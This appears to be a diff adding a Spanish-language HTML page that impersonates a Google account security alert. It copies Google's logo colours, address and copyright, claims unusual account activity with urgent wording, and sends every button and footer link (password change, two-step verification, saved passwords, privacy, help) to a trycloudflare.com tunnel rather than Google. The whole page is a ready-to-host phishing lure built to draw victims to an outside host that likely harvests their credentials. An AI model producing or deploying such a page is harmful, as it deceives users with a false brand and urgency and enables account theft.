@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avisos de Seguridad - Protege tu Cuenta Google</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e8eaed 100%);
+            color: #202124;
+            line-height: 1.6;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 750px;
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            padding: 35px;
+            margin-top: 40px;
+            border: 1px solid #dadce0;
+        }
+        
+        .google-header {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+        
+        .google-logo {
+            font-size: 44px;
+            font-weight: 500;
+            letter-spacing: -1px;
+        }
+        
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
+        
+        .security-icon {
+            text-align: center;
+            font-size: 70px;
+            color: #34A853;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        h1 {
+            font-size: 28px;
+            font-weight: 500;
+            text-align: center;
+            margin: 20px 0;
+            color: #202124;
+        }
+        
+        .alert-box {
+            background-color: #fef7e0;
+            border: 1px solid #fdd663;
+            border-left: 6px solid #f4b400;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 8px;
+            display: flex;
+            align-items: flex-start;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        
+        .alert-icon {
+            color: #f4b400;
+            margin-right: 15px;
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+        
+        p {
+            margin: 18px 0;
+            font-size: 16px;
+            color: #5F6368;
+            text-align: center;
+        }
+        
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin: 30px 0;
+        }
+        
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 14px 24px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            text-align: center;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(to right, #1a73e8, #4285f4);
+            color: white;
+            border: none;
+            box-shadow: 0 2px 4px rgba(26, 115, 232, 0.3);
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(to right, #1967d2, #357ae8);
+            box-shadow: 0 4px 8px rgba(26, 115, 232, 0.4);
+            transform: translateY(-2px);
+        }
+        
+        .btn-outline {
+            background-color: transparent;
+            color: #1A73E8;
+            border: 2px solid #1A73E8;
+        }
+        
+        .btn-outline:hover {
+            background-color: #f0f6ff;
+            transform: translateY(-2px);
+            box-shadow: 0 2px 6px rgba(26, 115, 232, 0.2);
+        }
+        
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 12px;
+            color: #5F6368;
+            max-width: 750px;
+            width: 100%;
+            padding: 20px;
+            border-top: 1px solid #dadce0;
+        }
+        
+        .link {
+            color: #1A73E8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .link:hover {
+            text-decoration: underline;
+        }
+        
+        .info-text {
+            font-size: 14px;
+            background-color: #F8F9FA;
+            padding: 18px;
+            border-radius: 8px;
+            margin: 25px 0;
+            border-left: 4px solid #34A853;
+        }
+        
+        .warning-text {
+            text-align: center;
+            font-size: 14px;
+            color: #EA4335;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 25px 20px;
+                margin-top: 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            .google-logo {
+                font-size: 36px;
+            }
+            
+            .security-icon {
+                font-size: 60px;
+            }
+            
+            .btn {
+                padding: 12px 20px;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="google-header">
+            <div class="google-logo">
+                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            </div>
+        </div>
+        
+        <div class="security-icon">
+            <i class="material-icons">security</i>
+        </div>
+        
+        <h1>Protege tu cuenta Google</h1>
+        
+        <div class="alert-box">
+            <i class="material-icons alert-icon">warning</i>
+            <div>
+                <strong>Alerta de seguridad importante:</strong> Hemos detectado actividad inusual en tu cuenta. Para mantener tu información segura, te recomendamos seguir inmediatamente los pasos a continuación.
+            </div>
+        </div>
+        
+        <p>Ayudamos a proteger tu cuenta para que solo tú puedas acceder, incluso si alguien más conoce tu contraseña. Revisa y fortalece tu seguridad ahora.</p>
+        
+        <div class="button-container">
+            <a href="https://cope-programmers-nearest-treatment.trycloudflare.com" class="btn btn-primary">
+                <i class="material-icons" style="margin-right: 10px;">security</i>
+                Verificar la seguridad de la cuenta
+            </a>
+            
+            <a href="https://cope-programmers-nearest-treatment.trycloudflare.com" class="btn btn-outline">
+                <i class="material-icons" style="margin-right: 10px;">lock</i>
+                Activar verificación en dos pasos
+            </a>
+            
+            <a href="https://cope-programmers-nearest-treatment.trycloudflare.com" class="btn btn-outline">
+                <i class="material-icons" style="margin-right: 10px;">vpn_key</i>
+                Verificar contraseñas guardadas
+            </a>
+            
+            <a href="https://cope-programmers-nearest-treatment.trycloudflare.com" class="btn btn-outline">
+                <i class="material-icons" style="margin-right: 10px;">devices</i>
+                Revisar actividad del dispositivo
+            </a>
+            
+            <a href="https://cope-programmers-nearest-treatment.trycloudflare.com" class="btn btn-primary">
+                <i class="material-icons" style="margin-right: 10px;">password</i>
+                Cambiar contraseña ahora
+            </a>
+        </div>
+        
+        <div class="info-text">
+            <strong>¿Por qué estás viendo esto?</strong> Google protege proactivamente las cuentas con sistemas automatizados que detectan actividades inusuales. Esta advertencia aparece cuando detectamos intentos de acceso sospechosos o comportamientos anómalos en tu cuenta.
+        </div>
+        
+        <p class="warning-text">Si no iniciaste esta acción, te recomendamos que revises tu cuenta inmediatamente.</p>
+    </div>
+    
+    <div class="footer">
+        <p>Google LLC · 1600 Amphitheatre Parkway, Mountain View, CA 94043</p>
+        <p>© 2023 Google LLC. Todos los derechos reservados. 
+           <a href="https://cope-programmers-nearest-treatment.trycloudflare.com" class="link">Política de Privacidad</a> · 
+           <a href="https://cope-programmers-nearest-treatment.trycloudflare.com" class="link">Términos de Servicio</a> · 
+           <a href="https://cope-programmers-nearest-treatment.trycloudflare.com" class="link">Ayuda</a>
+        </p>
+    </div>
+</body>
+</html>
